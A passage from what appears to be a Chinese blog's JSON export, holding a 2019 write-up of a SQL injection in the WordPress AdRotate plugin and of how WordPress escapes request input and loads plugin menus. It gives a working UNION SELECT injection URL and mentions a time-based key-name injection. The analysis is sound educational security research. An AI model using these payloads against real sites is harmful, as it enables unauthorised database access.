esc_attr($_GET['ad']);\n\nesc_attr方法是用来过滤HTML标签的，对sql注入无影响\n\nesc_attr方法见下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134539-3896947c-d38e-1.png)\n\n这样就导致了一个简单的sql注入的产生\n\n具体的payload如下\n\n```html\nhttp://127.0.0.1/wordpress/wp-admin/admin.php?page=adrotate-ads&view=edit&ad=-1+UNION+SELECT+1%2CUSER%28%29%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1\n```\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134552-4027b3d8-d38e-1.png)\n\n这里是一个有回显的注入，数据库user被回显到name处，sql注入执行成功\n\n漏洞分析到此结束，这个漏洞自身并没有什么亮点，不过在分析这个漏洞时，却发现了一些知识点\n\n \n\n## 问题一、Wordpress是如何处理$_GET $_POST等请求\n\n在上文分析的漏洞中，$ad_edit_id参数由$_GET['ad']获取\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134604-46f61ec0-d38e-1.png)\n\n \n\n传入并拼接的sql语句中执行\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134618-4f6fbd18-d38e-1.png)\n\n如果$ad_edit_id被单引号闭合呢？例如下图\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134630-569f59f4-d38e-1.png)\n我们是否可以通过get传入单引号，闭合语句中的单引号并进行注入呢？\n\n我们构造一个简单的payload测试下\n\n```html\n&ad=-1’\n```\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134642-5dc0e428-d38e-1.png)\n\n \n\n在adrotate_manage方法中下断\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134655-655ec272-d38e-1.png)\n可见在adrotate_manage中的$_GET['ad']中的值，此时为”-1\\’”\n也就是说，我们传入的单引号在进入adrotate_manage方法之前，已经被wordpress转义\n\n\n具体在什么位置被转义的呢？跟踪一下wordpress的代码\n位于wp-includes\\load.php中\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134709-6de5dd68-d38e-1.png)\n由上图可见，wordpress将$_GET\\$_POST\\$_COOKIE\\$_SERVER中的值，使用add_magic_quotes方法进行过滤\n值得一提的是，随后，将过滤后的GET与POST数组合并后覆盖$_REQUEST。在以往一些安全性不高的程序中，往往会出现，过滤了GET与POST，却忘记过滤REQUEST的情况，导致漏洞的产生。\n\n\n跟入add_magic_quotes方法\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134721-754300f4-d38e-1.png)\n可见，该方法使用addslashes方法，将传入的键值过滤，因此我们传入的”-1’”被过滤为”-1\\’”，可见wordpress在入口处是存在过滤机制的\n这里引申出一个思考题(问题二)：\n\n\n## 问题二：wordprss的这种过滤机制，是否仍然存在安全隐患\n\n连接问题一，我们已经知道wordpress是如何处理请求的，即处理请求中的键值\n\n如果一个插件开发过程中，存在如下的代码\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134735-7d44940c-d38e-1.png)\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134751-86dc854c-d38e-1.png)\n插件从请求中读取数组，然后通过INSERT方式将其插入数据库呢？\n\n在这种情况下，可以在传入的键名中加入payload，如下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134805-8f59a2ea-d38e-1.png)\n页面sleep 5秒，sql注入成功\n以上代码为以往漏洞挖掘中在其他程序中发现的真实案例，有兴趣可以参见\n[从某cmsV4.1.0 sql注入漏洞看程序开发安全隐患](https://xz.aliyun.com/t/6237 \"从某cmsV4.1.0 sql注入漏洞看程序开发安全隐患\")\n在开发wordpress插件时，会不会仍然有开发者犯下这样的错误呢？\n\n\n\n## 问题三：wordpress是如何加载这个插件，我们如何构造利用链\n\n我们的利用点位于wp-content\\plugins\\adrotate\\dashboard\\publisher\\adverts-edit.php\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135233-2edf3cbc-d38f-1.png)\n\n这个文件并没有定义与初始化一些变量，直接通过url访问这个地址，显然是不行的\n\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135247-375fff7a-d38f-1.png)\n查找adverts-edit.php在哪里被包含\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135259-3eb6cc0e-d38f-1.png)\n\n跟到adrotate.php中，位于274行处，adrotate_manage方法中的if分支里\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135313-46d0e67c-d38f-1.png)\n\n \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135326-4eece2c0-d38f-1.png)\n\n在adrotate_manage方法中，还可以看到$ad_edit_id变量被赋值的过程，见上图173行处\n\n \n\n但是新的问题是，adrotate_manage方法是如何被wordpress调用的，我们怎样构造url才能执行adrotate_manage方法？\n\n \n\n在adrotate.php106行处\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135342-58049592-d38f-1.png)\n\nadrotate_manage作为参数传入add_submenu_page方法\n\n我们来看下add_submenu_page方法\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135357-614c0a2c-d38f-1.png)\n\nadd_submenu_page()方法为后台顶级菜单添加子菜单，它的参数解释如下\n\n`$parent_slug：`(字符串) (必须)顶级菜单名称，可以在顶级菜单中加入我们的子菜单，也可以在自定义顶级菜单中加入子菜单；（也就是 add_menu_page() 函数中的 $menu_slug 参数）\n\n`$page_title：`(字符串) (必须) 这个参数是子菜单的标题，将会显示在浏览器的标题栏，默认为空；\n\n`$menu_title：`(字符串) (必须) 显示的菜单名称，默认为空；\n\n`$capability：`(字符串) (必须) 用户权限，定义了具有哪些权限的用户会看到这个子菜单（权限部分请看文章结尾处），默认为空；\n\n`$menu_slug：`(字符串) (必须) 显示在URl上面的菜单名称，默认为空；\n\n`$function：`所有调用的函数名称，通过调用这个函数来显示这个子菜单页面的内容。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135411-69333b5c-d38f-1.png)\n\n回到本插件中可以看到，在adrotate中，adrotate插件注册了一个名为Manage Adverts的子菜单，当点击此菜单时，将会执行adrotate_manage方法，此时url为\n```html\nhttp://127.0.0.1/wordpress/wp-admin/admin.php?page=adrotate-ads\n```\npage参数后面的值为add_submenu_page中$menu_slug的值\n\n既然Manage Adverts为子菜单，那么它的顶级菜单是什么？\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135425-71f746ac-d38f-1.png)\n\n可见，在上图103行处，存在一处add_menu_page方法，该方法定义了该插件的顶级菜单，名为AdRotate，访问url为\n```html\nhttp://127.0.0.1/wordpress/wp-admin/admin.php?page=adrotate\n```\n登录wordpress后台，安装好adrotate插件后，可见adrotate已经出现在菜单中，主次菜单名与url符合我们的预期\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135439-7a687522-d38f-1.png)\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135452-81db3042-d38f-1.png)\n\n \n\n回头继续看代码，以上定义顶级菜单，子菜单的行为，都在adrotate_dashboard方法中\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135505-8975e8d8-d38f-1.png)\n\nadrotate_dashboard方法是如何被wordpress加载的呢？\n\n仍然在adrotate.php中\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135516-905213ca-d38f-1.png)\n\n在上图77行处，adrotate_dashboard方法作为参数传递入add_action方法中\n\nadd_action方法的作用是将函数连接到指定action上。在这里，将adrotate_dashboard方法连接到admin_menu 钩子上\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135526-96578b38-d38f-1.png)\n\n而admin_menu 钩子的作用是在管理员加载管理菜单之前触发所连接上的函数。\n\n也就是说，在管理员加载管理菜单之前，我们的adrotate_dashboard方法会被加载，adrotate_dashboard方法中的代码被执行，所以我们的adrotate菜单被添加到管理页面的菜单栏中\n\n \n\n## 后记\n\n漏洞比较简单，但是分析wordpress机制的过程还是比较有意思的","source":"_posts/AdRotate-PluginSQL.md","raw":"---\ntitle: 从一个简单的wordpress插件漏洞研究一下wordpress插件原理\ndate: 2019-09-15 14:27:41\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n在AdRotate Plugin5.2以及5.2之前的版本中，存在一处sql注入漏洞，该漏洞为FortiGuard实验室发现\n\n<!--more-->\n\n漏洞位于AdRotate Plugin的\\dashboard\\publisher\\adverts-edit.php\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134445-1848c74e-d38e-1.png)\n可见上图中，存在着多出sql查询语句\n\n但是位于25行处，明显可见存在sql注入隐患\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134456-1eb7e6e6-d38e-1.png)\n位于上图红框处，在拼接sql语句时，$ad_edit_id变量被拼接在id值部分。但是在这里，并没有用单引号将其值闭合\n\n$ad_edit_id变量值可以通过get请求的方式传入，如下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134513-28cd777c-d38e-1.png)\n\n位于上图173行，可见$ad_edit_id = esc_attr($_GET['ad']);\n\nesc_attr方法是用来过滤HTML标签的，对sql注入无影响\n\nesc_attr方法见下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134539-3896947c-d38e-1.png)\n\n这样就导致了一个简单的sql注入的产生\n\n具体的payload如下\n\n```html\nhttp://127.0.0.1/wordpress/wp-admin/admin.php?page=adrotate-ads&view=edit&ad=-1+UNION+SELECT+1%2CUSER%28%29%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1\n```\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134552-4027b3d8-d38e-1.png)\n\n这里是一个有回显的注入，数据库user被回显到name处，sql注入执行成功\n\n漏洞分析到此结束，这个漏洞自身并没有什么亮点，不过在分析这个漏洞时，却发现了一些知识点\n\n \n\n## 问题一、Wordpress是如何处理$_GET $_POST等请求\n\n在上文分析的漏洞中，$ad_edit_id参数由$_GET['ad']获取\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134604-46f61ec0-d38e-1.png)\n\n \n\n传入并拼接的sql语句中执行\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134618-4f6fbd18-d38e-1.png)\n\n如果$ad_edit_id被单引号闭合呢？例如下图\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134630-569f59f4-d38e-1.png)\n我们是否可以通过get传入单引号，闭合语句中的单引号并进行注入呢？\n\n我们构造一个简单的payload测试下\n\n```html\n&ad=-1’\n```\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134642-5dc0e428-d38e-1.png)\n\n \n\n在adrotate_manage方法中下断\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134655-655ec272-d38e-1.png)\n可见在adrotate_manage中的$_GET['ad']中的值，此时为”-1\\’”\n也就是说，我们传入的单引号在进入adrotate_manage方法之前，已经被wordpress转义\n\n\n具体在什么位置被转义的呢？跟踪一下wordpress的代码\n位于wp-includes\\load.php中\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134709-6de5dd68-d38e-1.png)\n由上图可见，wordpress将$_GET\\$_POST\\$_COOKIE\\$_SERVER中的值，使用add_magic_quotes方法进行过滤\n值得一提的是，随后，将过滤后的GET与POST数组合并后覆盖$_REQUEST。在以往一些安全性不高的程序中，往往会出现，过滤了GET与POST，却忘记过滤REQUEST的情况，导致漏洞的产生。\n\n\n跟入add_magic_quotes方法\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134721-754300f4-d38e-1.png)\n可见，该方法使用addslashes方法，将传入的键值过滤，因此我们传入的”-1’”被过滤为”-1\\’”，可见wordpress在入口处是存在过滤机制的\n这里引申出一个思考题(问题二)：\n\n\n## 问题二：wordprss的这种过滤机制，是否仍然存在安全隐患\n\n连接问题一，我们已经知道wordpress是如何处理请求的，即处理请求中的键值\n\n如果一个插件开发过程中，存在如下的代码\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134735-7d44940c-d38e-1.png)\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134751-86dc854c-d38e-1.png)\n插件从请求中读取数组，然后通过INSERT方式将其插入数据库呢？\n\n在这种情况下，可以在传入的键名中加入payload，如下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134805-8f59a2ea-d38e-1.png)\n页面sleep 5秒，sql注入成功\n以上代码为以往漏洞挖掘中在其他程序中发现的真实案例，有兴趣可以参见\n[从某cmsV4.1.0 sql注入漏洞看程序开发安全隐患](https://xz.aliyun.com/t/6237 \"从某cmsV4.1.0 sql注入漏洞看程序开发安全隐患\")\n在开发wordpress插件时，会不会仍然有开发者犯下这样的错误呢？\n\n\n\n## 问题三：wordpress是如何加载这个插件，我们如何构造利用链\n\n我们的利用点位于wp-content\\plugins\\adrotate\\dashboard\\publisher\\adverts-edit.php\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135233-2edf3cbc-d38f-1.png)\n\n这个文件并没有定义与初始化一些变量，直接通过url访问这个地址，显然是不行的\n\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135247-375fff7a-d38f-1.png)\n查找adverts-edit.php在哪里被包含\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135259-3eb6cc0e-d38f-1.png)\n\n跟到adrotate.php中，位于274行处，adrotate_manage方法中的if分支里\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135313-46d0e67c-d38f-1.png)\n\n \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135326-4eece2c0-d38f-1.png)\n\n在adrotate_manage方法中，还可以看到$ad_edit_id变量被赋值的过程，见上图173行处\n\n \n\n但是新的问题是，adrotate_manage方法是如何被wordpress调用的，我们怎样构造url才能执行adrotate_manage方法？\n\n \n\n在adrotate.php106行处\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135342-58049592-d38f-1.png)\n\nadrotate_manage作为参数传入add_submenu_page方法\n\n我们来看下add_submenu_page方法\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135357-614c0a2c-d38f-1.png)\n\nadd_submenu_page()方法为后台顶级菜单添加子菜单，它的参数解释如下\n\n`$parent_slug：`(字符串) (必须)顶级菜单名称，可以在顶级菜单中加入我们的子菜单，也可以在自定义顶级菜单中加入子菜单；（也就是 add_menu_page() 函数中的 $menu_slug 参数）\n\n`$page_title：`(字符串) (必须) 这个参数是子菜单的标题，将会显示在浏览器的标题栏，默认为空；\n\n`$menu_title：`(字符串) (必须) 显示的菜单名称，默认为空；\n\n`$capability：`(字符串) (必须) 用户权限，定义了具有哪些权限的用户会看到这个子菜单（权限部分请看文章结尾处），默认为空；\n\n`$menu_slug：`(字符串) (必须) 显示在URl上面的菜单名称，默认为空；\n\n`$function：`所有调用的函数名称，通过调用这个函数来显示这个子菜单页面的内容。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135411-69333b5c-d38f-1.png)\n\n回到本插件中可以看到，在adrotate中，adrotate插件注册了一个名为Manage Adverts的子菜单，当点击此菜单时，将会执行adrotate_manage方法，此时url为\n```html\nhttp://127.0.0.1/wordpress/wp-admin/admin.php?page=adrotate-ads\n```\npage参数后面的值为add_submenu_page中$menu_slug的值\n\n既然Manage Adverts为子菜单，那么它的顶级菜单是什么？\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135425-71f746ac-d38f-1.png)\n\n可见，在上图103行处，存在一处add_menu_page方法，该方法定义了该插件的顶级菜单，名为AdRotate，访问url为\n```html\nhttp://127.0.0.1/wordpress/wp-admin/admin.php?page=adrotate\n```\n登录wordpress后台，安装好adrotate插件后，可见adrotate已经出现在菜单中，主次菜单名与url符合我们的预期\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135439-7a687522-d38f-1.png)\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135452-81db3042-d38f-1.png)\n\n \n\n回头继续看代码，以上定义顶级菜单，子菜单的行为，都在adrotate_dashboard方法中\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135505-8975e8d8-d38f-1.png)\n\nadrotate_dashboard方法是如何被wordpress加载的呢？\n\n仍然在adrotate.php中\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135516-905213ca-d38f-1.png)\n\n在上图77行处，adrotate_dashboard方法作为参数传递入add_action方法中\n\nadd_action方法的作用是将函数连接到指定action上。在这里，将adrotate_dashboard方法连接到admin_menu 钩子上\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910135526-96578b38-d38f-1.png)\n\n而admin_menu 钩子的作用是在管理员加载管理菜单之前触发所连接上的函数。\n\n也就是说，在管理员加载管理菜单之前，我们的adrotate_dashboard方法会被加载，adrotate_dashboard方法中的代码被执行，所以我们的adrotate菜单被添加到管理页面的菜单栏中\n\n \n\n## 后记\n\n漏洞比较简单，但是分析wordpress机制的过程还是比较有意思的","slug":"AdRotate-PluginSQL","published":1,"updated":"2020-10-27T09:27:09.990Z","_id":"ckgrozu7l0001wsa93tzb7ixp","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在AdRotate Plugin5.2以及5.2之前的版本中，存在一处sql注入漏洞，该漏洞为FortiGuard实验室发现</p>\n<a id=\"more\"></a>\n\n<p>漏洞位于AdRotate Plugin的\\dashboard\\publisher\\adverts-edit.php</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134445-1848c74e-d38e-1.png\"><br>可见上图中，存在着多出sql查询语句</p>\n<p>但是位于25行处，明显可见存在sql注入隐患</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134456-1eb7e6e6-d38e-1.png\"><br>位于上图红框处，在拼接sql语句时，$ad_edit_id变量被拼接在id值部分。但是在这里，并没有用单引号将其值闭合</p>\n<p>$ad_edit_id变量值可以通过get请求的方式传入，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134513-28cd777c-d38e-1.png\"></p>\n<p>位于上图173行，可见$ad_edit_id = esc_attr($_GET[‘ad’]);</p>\n<p>esc_attr方法是用来过滤HTML标签的，对sql注入无影响</p>\n<p>esc_attr方法见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134539-3896947c-d38e-1.png\"></p>\n<p>这样就导致了一个简单的sql注入的产生</p>\n<p>具体的payload如下</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/wordpress/wp-admin/admin.php?page=adrotate-ads&amp;view=edit&amp;ad=-1+UNION+SELECT+1%2CUSER%28%29%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1</span><br></pre></td></tr></table></figure>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134552-4027b3d8-d38e-1.png\"></p>\n<p>这里是一个有回显的注入，数据库user被回显到name处，sql注入执行成功</p>\n<p>漏洞分析到此结束，这个漏洞自身并没有什么亮点，不过在分析这个漏洞时，却发现了一些知识点</p>\n<h2 id=\"问题一、Wordpress是如何处理-GET-POST等请求\"><a href=\"#问题一、Wordpress是如何处理-GET-POST等请求\" class=\"headerlink\" title=\"问题一、Wordpress是如何处理$_GET $_POST等请求\"></a>问题一、Wordpress是如何处理$_GET $_POST等请求</h2><p>在上文分析的漏洞中，$ad_edit_id参数由$_GET[‘ad’]获取</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134604-46f61ec0-d38e-1.png\"></p>\n<p>传入并拼接的sql语句中执行<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134618-4f6fbd18-d38e-1.png\"></p>\n<p>如果$ad_edit_id被单引号闭合呢？例如下图<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134630-569f59f4-d38e-1.png\"><br>我们是否可以通过get传入单引号，闭合语句中的单引号并进行注入呢？</p>\n<p>我们构造一个简单的payload测试下</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;ad=-1’</span><br></pre></td></tr></table></figure>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134642-5dc0e428-d38e-1.png\"></p>\n<p>在adrotate_manage方法中下断<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134655-655ec272-d38e-1.png\"><br>可见在adrotate_manage中的$_GET[‘ad’]中的值，此时为”-1\\’”<br>也就是说，我们传入的单引号在进入adrotate_manage方法之前，已经被wordpress转义</p>\n<p>具体在什么位置被转义的呢？跟踪一下wordpress的代码<br>位于wp-includes\\load.php中<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134709-6de5dd68-d38e-1.png\"><br>由上图可见，wordpress将$_GET$_POST$_COOKIE$_SERVER中的值，使用add_magic_quotes方法进行过滤<br>值得一提的是，随后，将过滤后的GET与POST数组合并后覆盖$_REQUEST。在以往一些安全性不高的程序中，往往会出现，过滤了GET与POST，却忘记过滤REQUEST的情况，导致漏洞的产生。</p>\n<p>跟入add_magic_quotes方法<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134721-754300f4-d38e-1.png\"><br>可见，该方法使用addslashes方法，将传入的键值过滤，因此我们传入的”-1’”被过滤为”-1\\’”，可见wordpress在入口处是存在过滤机制的<br>这里引申出一个思考题(问题二)：</p>\n<h2 id=\"问题二：wordprss的这种过滤机制，是否仍然存在安全隐患\"><a href=\"#问题二：wordprss的这种过滤机制，是否仍然存在安全隐患\" class=\"headerlink\" title=\"问题二：wordprss的这种过滤机制，是否仍然存在安全隐患\"></a>问题二：wordprss的这种过滤机制，是否仍然存在安全隐患</h2><p>连接问题一，我们已经知道wordpress是如何处理请求的，即处理请求中的键值</p>\n<p>如果一个插件开发过程中，存在如下的代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134735-7d44940c-d38e-1.png\"><br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134751-86dc854c-d38e-1.png\"><br>插件从请求中读取数组，然后通过INSERT方式将其插入数据库呢？</p>\n<p>在这种情况下，可以在传入的键名中加入payload，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134805-8f59a2ea-d38e-1.png\"><br>页面sleep 5秒，sql注入成功<br>以上代码为以往漏洞挖掘中在其他程序中发现的真实案例，有兴趣可以参见<br><a href=\"https://xz.aliyun.com/t/6237\" title=\"从某cmsV4.1.0 sql注入漏洞看程序开发安全隐患\">从某cmsV4.1.0 sql注入漏洞看程序开发安全隐患</a><br>在开发wordpress插件时，会不会仍然有开发者犯下这样的错误呢？</p>\n<h2 id=\"问题三：wordpress是如何加载这个插件，我们如何构造利用链\"><a href=\"#问题三：wordpress是如何加载这个插件，我们如何构造利用链\" class=\"headerlink\" title=\"问题三：wordpress是如何加载这个插件，我们如何构造利用链\"></a>问题三：wordpress是如何加载这个插件，我们如何构造利用链</h2><p>我们的利用点位于wp-content\\plugins\\adrotate\\dashboard\\publisher\\adverts-edit.php</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135233-2edf3cbc-d38f-1.png\"></p>\n<p>这个文件并没有定义与初始化一些变量，直接通过url访问这个地址，显然是不行的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135247-375fff7a-d38f-1.png\"><br>查找adverts-edit.php在哪里被包含</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135259-3eb6cc0e-d38f-1.png\"></p>\n<p>跟到adrotate.php中，位于274行处，adrotate_manage方法中的if分支里</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135313-46d0e67c-d38f-1.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135326-4eece2c0-d38f-1.png\"></p>\n<p>在adrotate_manage方法中，还可以看到$ad_edit_id变量被赋值的过程，见上图173行处</p>\n<p>但是新的问题是，adrotate_manage方法是如何被wordpress调用的，我们怎样构造url才能执行adrotate_manage方法？</p>\n<p>在adrotate.php106行处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135342-58049592-d38f-1.png\"></p>\n<p>adrotate_manage作为参数传入add_submenu_page方法</p>\n<p>我们来看下add_submenu_page方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135357-614c0a2c-d38f-1.png\"></p>\n<p>add_submenu_page()方法为后台顶级菜单添加子菜单，它的参数解释如下</p>\n<p><code>$parent_slug：</code>(字符串) (必须)顶级菜单名称，可以在顶级菜单中加入我们的子菜单，也可以在自定义顶级菜单中加入子菜单；（也就是 add_menu_page() 函数中的 $menu_slug 参数）</p>\n<p><code>$page_title：</code>(字符串) (必须) 这个参数是子菜单的标题，将会显示在浏览器的标题栏，默认为空；</p>\n<p><code>$menu_title：</code>(字符串) (必须) 显示的菜单名称，默认为空；</p>\n<p><code>$capability：</code>(字符串) (必须) 用户权限，定义了具有哪些权限的用户会看到这个子菜单（权限部分请看文章结尾处），默认为空；</p>\n<p><code>$menu_slug：</code>(字符串) (必须) 显示在URl上面的菜单名称，默认为空；</p>\n<p><code>$function：</code>所有调用的函数名称，通过调用这个函数来显示这个子菜单页面的内容。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135411-69333b5c-d38f-1.png\"></p>\n<p>回到本插件中可以看到，在adrotate中，adrotate插件注册了一个名为Manage Adverts的子菜单，当点击此菜单时，将会执行adrotate_manage方法，此时url为</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/wordpress/wp-admin/admin.php?page=adrotate-ads</span><br></pre></td></tr></table></figure>\n<p>page参数后面的值为add_submenu_page中$menu_slug的值</p>\n<p>既然Manage Adverts为子菜单，那么它的顶级菜单是什么？</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135425-71f746ac-d38f-1.png\"></p>\n<p>可见，在上图103行处，存在一处add_menu_page方法，该方法定义了该插件的顶级菜单，名为AdRotate，访问url为</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/wordpress/wp-admin/admin.php?page=adrotate</span><br></pre></td></tr></table></figure>\n<p>登录wordpress后台，安装好adrotate插件后，可见adrotate已经出现在菜单中，主次菜单名与url符合我们的预期</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135439-7a687522-d38f-1.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135452-81db3042-d38f-1.png\"></p>\n<p>回头继续看代码，以上定义顶级菜单，子菜单的行为，都在adrotate_dashboard方法中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135505-8975e8d8-d38f-1.png\"></p>\n<p>adrotate_dashboard方法是如何被wordpress加载的呢？</p>\n<p>仍然在adrotate.php中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135516-905213ca-d38f-1.png\"></p>\n<p>在上图77行处，adrotate_dashboard方法作为参数传递入add_action方法中</p>\n<p>add_action方法的作用是将函数连接到指定action上。在这里，将adrotate_dashboard方法连接到admin_menu 钩子上</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135526-96578b38-d38f-1.png\"></p>\n<p>而admin_menu 钩子的作用是在管理员加载管理菜单之前触发所连接上的函数。</p>\n<p>也就是说，在管理员加载管理菜单之前，我们的adrotate_dashboard方法会被加载，adrotate_dashboard方法中的代码被执行，所以我们的adrotate菜单被添加到管理页面的菜单栏中</p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" 